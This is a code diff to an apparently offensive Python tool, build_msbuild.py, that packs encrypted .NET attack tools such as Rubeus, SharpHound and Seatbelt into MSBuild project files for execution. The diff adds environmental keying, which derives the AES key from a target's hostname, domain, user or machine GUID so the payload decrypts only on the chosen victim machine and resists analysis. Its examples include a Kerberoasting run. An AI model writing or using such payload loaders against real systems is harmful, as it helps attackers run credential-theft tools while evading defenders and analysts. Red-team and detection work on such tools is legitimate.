@@ -14,13 +14,16 @@ Examples:
   python build_msbuild.py Rubeus.exe -e aes -- kerberoast
   python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
   python build_msbuild.py MyDll.dll --type Namespace.Class --method Run
-  python build_msbuild.py MyDll.dll --type Namespace.Class --method Execute -- arg1 arg2
+  python build_msbuild.py Seatbelt.exe --keying hostname=WORKSTATION01,domain=CORP -- -group=all
 """
 
 import argparse
 import base64
+import hashlib
 import os
 import sys
+
+KEYING_PROPERTIES = ("hostname", "domain", "user", "machineguid")
 
 
 def xor_encrypt(data: bytes, key: bytes) -> bytes:
@@ -43,6 +46,33 @@ def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
     encryptor = cipher.encryptor()
     return encryptor.update(padded) + encryptor.finalize()
+
+
+def parse_keying(spec: str) -> dict:
+    """Parse keying spec like 'hostname=WORKSTATION01,domain=CORP' into a dict."""
+    result = {}
+    for pair in spec.split(","):
+        pair = pair.strip()
+        if "=" not in pair:
+            print(f"[-] Invalid keying spec: {pair} (expected name=value)", file=sys.stderr)
+            sys.exit(1)
+        name, value = pair.split("=", 1)
+        name = name.strip().lower()
+        if name not in KEYING_PROPERTIES:
+            print(f"[-] Unknown keying property: {name}", file=sys.stderr)
+            print(f"    Valid: {', '.join(KEYING_PROPERTIES)}", file=sys.stderr)
+            sys.exit(1)
+        result[name] = value.strip()
+    return result
+
+
+def derive_key(salt: bytes, keying: dict) -> bytes:
+    """Derive AES-256 key from salt + sorted environment properties via SHA-256."""
+    parts = []
+    for name in sorted(keying.keys()):
+        parts.append(f"{name}={keying[name].upper()}\n")
+    keying_str = "".join(parts)
+    return hashlib.sha256(salt + keying_str.encode("utf-8")).digest()
 
 
 def patch_template_for_xor(template: str) -> str:
@@ -80,22 +110,43 @@ def patch_template_for_xor(template: str) -> str:
         '    static string IV_B64 = "YOURIVHERE";\n', ""
     )
 
-    # Remove IV decode and cleanup in Execute()
+    # Remove keying fields (not supported in XOR mode)
     template = template.replace(
-        "            byte[] iv = Convert.FromBase64String(IV_B64);\n", ""
+        '    static string KEYING = "YOURKEYINGHERE";\n', ""
     )
     template = template.replace(
-        "            byte[] clearAssembly = AesDecrypt(encrypted, key, iv);",
-        "            byte[] clearAssembly = XorDecrypt(encrypted, key);",
-    )
-    template = template.replace(
-        "            Array.Clear(iv, 0, iv.Length);\n", ""
+        '    static string SALT_B64 = "YOURSALTHERE";\n', ""
     )
 
-    # Remove crypto using/namespace (not needed for XOR)
-    template = template.replace("using System.Security.Cryptography;\n", "")
+    # Remove DeriveKey method
+    derive_start = "    static byte[] DeriveKey(string saltB64, string keying)\n    {"
+    derive_end = "    }\n\n    static string ENCRYPTED_B64"
+    if derive_start in template:
+        idx_start = template.index(derive_start)
+        idx_end = template.index(derive_end)
+        template = template[:idx_start] + "    static string ENCRYPTED_B64" + template[idx_end + len(derive_end):]
+
+    # Simplify key resolution — remove keying branch, just use KEY_B64
     template = template.replace(
-        "      <Using Namespace=\"System.Security.Cryptography\" />\n", ""
+        "            byte[] key;\n"
+        "            if (KEYING.Length > 0)\n"
+        "                key = DeriveKey(SALT_B64, KEYING);\n"
+        "            else\n"
+        "                key = Convert.FromBase64String(KEY_B64);\n"
+        "            byte[] iv = Convert.FromBase64String(IV_B64);\n"
+        "\n"
+        "            byte[] clearAssembly;\n"
+        "            try\n"
+        "            {\n"
+        "                clearAssembly = AesDecrypt(encrypted, key, iv);\n"
+        "            }\n"
+        "            catch (CryptographicException)\n"
+        "            {\n"
+        '                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
+        "                return true;\n"
+        "            }",
+        "            byte[] key = Convert.FromBase64String(KEY_B64);\n"
+        "            byte[] clearAssembly = XorDecrypt(encrypted, key);",
     )
 
     return template
@@ -124,6 +175,13 @@ def main():
         "--iv", help="AES IV as hex (16 bytes / 32 hex chars, ignored with -e xor)"
     )
     parser.add_argument(
+        "--keying",
+        help="Environmental keying: derive AES key from target properties. "
+             "Format: name=value,name=value. "
+             "Properties: hostname, domain, user, machineguid. "
+             "Example: --keying hostname=WS01,domain=CORP"
+    )
+    parser.add_argument(
         "--type",
         help="Fully qualified type name to invoke (e.g. Namespace.Class). Required for DLLs without an entry point."
     )
@@ -138,6 +196,14 @@ def main():
     # Validate --type and --method are used together
     if (args.type is None) != (args.method is None):
         print("[-] --type and --method must be specified together.", file=sys.stderr)
+        sys.exit(1)
+
+    # Validate --keying constraints
+    if args.keying and args.encryption == "xor":
+        print("[-] --keying requires AES encryption (cannot use with -e xor).", file=sys.stderr)
+        sys.exit(1)
+    if args.keying and args.key:
+        print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
         sys.exit(1)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -179,8 +245,44 @@ def main():
         template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
         template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
 
+    elif args.keying:
+        # AES with environmental keying
+        keying = parse_keying(args.keying)
+        salt = os.urandom(16)
+        key = derive_key(salt, keying)
+
+        if args.iv:
+            iv = bytes.fromhex(args.iv)
+            if len(iv) != 16:
+                print(f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}", file=sys.stderr)
+                sys.exit(1)
+        else:
+            iv = os.urandom(16)
+
+        keying_names = ",".join(sorted(keying.keys()))
+
+        print(f"[*] Mode: AES-256-CBC + environmental keying", file=sys.stderr)
+        print(f"[*] Keying: {keying_names}", file=sys.stderr)
+        for name in sorted(keying.keys()):
+            print(f"[*]   {name} = {keying[name]}", file=sys.stderr)
+        print(f"[*] Salt:    {salt.hex()}", file=sys.stderr)
+        print(f"[*] Derived: {key.hex()}", file=sys.stderr)
+        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)
+
+        encrypted = aes_encrypt(assembly_bytes, key, iv)
+
+        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
+        salt_b64 = base64.b64encode(salt).decode("ascii")
+        iv_b64 = base64.b64encode(iv).decode("ascii")
+
+        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
+        template = template.replace('"YOURKEYHERE"', '""')
+        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
+        template = template.replace('"YOURKEYINGHERE"', f'"{keying_names}"')
+        template = template.replace('"YOURSALTHERE"', f'"{salt_b64}"')
+
     else:
-        # AES-256-CBC (default)
+        # AES-256-CBC with static key (default)
         if args.key:
             key = bytes.fromhex(args.key)
             if len(key) != 32:
@@ -216,6 +318,8 @@ def main():
         template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
         template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
         template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
+        template = template.replace('"YOURKEYINGHERE"', '""')
+        template = template.replace('"YOURSALTHERE"', '""')
 
     print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
 
